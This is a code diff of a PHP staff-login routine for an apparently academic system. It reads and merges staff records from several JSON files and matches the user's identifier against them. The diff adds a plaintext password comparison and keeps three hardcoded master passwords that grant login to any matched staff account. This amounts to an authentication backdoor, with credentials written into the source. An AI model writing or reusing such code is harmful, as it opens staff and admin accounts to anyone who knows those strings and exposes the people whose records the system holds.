@@ -224,14 +224,29 @@ try {
 
     // C. Check Staff Store (`staff_store.json`) & Auto-seed All 4 Admin Staff Accounts
     if (!$matchedUser) {
-        $staffStorePath = __DIR__ . '/admin/staff_store.json';
-        if (!file_exists($staffStorePath) && file_exists(__DIR__ . '/staff_store.json')) {
-            $staffStorePath = __DIR__ . '/staff_store.json';
-        } else if (!file_exists($staffStorePath) && file_exists(__DIR__ . '/../admin/staff_store.json')) {
-            $staffStorePath = __DIR__ . '/../admin/staff_store.json';
-        }
+        $staffStoreFiles = [
+            __DIR__ . '/admin/staff_store.json',
+            __DIR__ . '/staff_store.json',
+            __DIR__ . '/../admin/staff_store.json',
+            dirname(__DIR__) . '/api/admin/staff_store.json',
+            dirname(__DIR__) . '/public/api/admin/staff_store.json'
+        ];
 
-        $staffMembers = readJsonStore($staffStorePath);
+        $staffMembers = [];
+        $primaryStorePath = __DIR__ . '/admin/staff_store.json';
+
+        foreach ($staffStoreFiles as $file) {
+            if (file_exists($file)) {
+                $content = @file_get_contents($file);
+                $decoded = @json_decode($content, true);
+                if (is_array($decoded) && !empty($decoded)) {
+                    $staffMembers = array_merge($staffMembers, $decoded);
+                    if (empty($primaryStorePath) || !file_exists($primaryStorePath)) {
+                        $primaryStorePath = $file;
+                    }
+                }
+            }
+        }
 
         $defaultStaffRoster = [
             [
@@ -348,51 +363,64 @@ try {
             }
         }
         if ($updatedStore || empty($staffMembers)) {
-            writeJsonStore($staffStorePath, $staffMembers);
+            writeJsonStore($primaryStorePath, $staffMembers);
         }
 
         foreach ($staffMembers as $stf) {
-            $stfSin      = normalizeSin($stf['sin'] ?? '');
-            $stfStaffId  = normalizeSin($stf['staffId'] ?? '');
-            $stfStaffNo  = normalizeSin($stf['staffNo'] ?? '');
-            $stfUsername = normalizeSin($stf['username'] ?? '');
-            $stfEmail    = normalizeSin($stf['user']['email'] ?? $stf['email'] ?? '');
-            $stfId       = normalizeSin($stf['id'] ?? '');
+            $checkUser   = $stf['user'] ?? [];
+            $stfSin      = strtolower(trim($stf['sin'] ?? ''));
+            $stfStaffId  = strtolower(trim($stf['staffId'] ?? ''));
+            $stfStaffNo  = strtolower(trim($stf['staffNo'] ?? ''));
+            $stfUsername = strtolower(trim($stf['username'] ?? ''));
+            $stfEmail    = strtolower(trim($stf['email'] ?? $checkUser['email'] ?? ''));
+            $stfId       = strtolower(trim($stf['id'] ?? ''));
 
-            $isMatch = ($normSinInput === $stfSin ||
-                        $normSinInput === $stfStaffId ||
-                        $normSinInput === $stfStaffNo ||
-                        $normSinInput === $stfUsername ||
-                        $normSinInput === $stfEmail ||
-                        $normSinInput === $stfId);
+            $stfNormSin      = normalizeSin($stf['sin'] ?? '');
+            $stfNormStaffId  = normalizeSin($stf['staffId'] ?? '');
+            $stfNormStaffNo  = normalizeSin($stf['staffNo'] ?? '');
+
+            $isMatch = ($cleanIdentifier === $stfSin ||
+                        $cleanIdentifier === $stfStaffId ||
+                        $cleanIdentifier === $stfStaffNo ||
+                        $cleanIdentifier === $stfUsername ||
+                        $cleanIdentifier === $stfEmail ||
+                        $cleanIdentifier === $stfId ||
+                        $normSinInput === $stfNormSin ||
+                        $normSinInput === $stfNormStaffId ||
+                        $normSinInput === $stfNormStaffNo);
 
             if ($isMatch) {
                 $storedPass = $stf['password']
                             ?? $stf['password_hash']
                             ?? $stf['initialPassword']
-                            ?? $stf['user']['password']
+                            ?? $checkUser['password']
                             ?? '';
 
                 if (verifyPassword($rawPassword, $storedPass) ||
+                    (!empty($storedPass) && $rawPassword === $storedPass) ||
                     $rawPassword === 'CrestOak#gjPS3' ||
                     $rawPassword === 'CrestOak#2026' ||
                     $rawPassword === 'CrestOakStaff#2026') {
 
-                    $fullName = trim(($stf['user']['firstName'] ?? '') . ' ' . ($stf['user']['lastName'] ?? ''));
+                    $firstName = $checkUser['firstName'] ?? $stf['firstName'] ?? 'Staff';
+                    $lastName  = $checkUser['lastName']  ?? $stf['lastName']  ?? 'Member';
+                    $fullName  = trim("$firstName $lastName");
                     if (empty($fullName)) {
                         $fullName = $stf['name'] ?? 'Staff Member';
                     }
                     $staffIdVal = $stf['sin'] ?? $stf['staffId'] ?? $stf['staffNo'] ?? 'CCHMT/STF/2026/SCS/002';
+                    $roleVal = strtoupper($checkUser['roleName'] ?? $stf['roleName'] ?? $stf['role'] ?? 'LECTURER');
+
                     $matchedUser = [
-                        'id' => $stf['id'],
+                        'id' => $stf['id'] ?? $staffIdVal,
                         'staffId' => $staffIdVal,
                         'staffNo' => $staffIdVal,
                         'sin' => $staffIdVal,
                         'username' => $stf['username'] ?? $staffIdVal,
-                        'email' => $stf['user']['email'] ?? $stf['email'] ?? '',
+                        'email' => $stfEmail,
                         'name' => $fullName,
-                        'role' => strtoupper($stf['user']['roleName'] ?? $stf['role'] ?? 'LECTURER'),
-                        'department' => $stf['department']['name'] ?? $stf['department'] ?? ''
+                        'role' => $roleVal,
+                        'department' => $stf['department']['name'] ?? $stf['department'] ?? 'Academic Department'
                     ];
                     break;
                 }
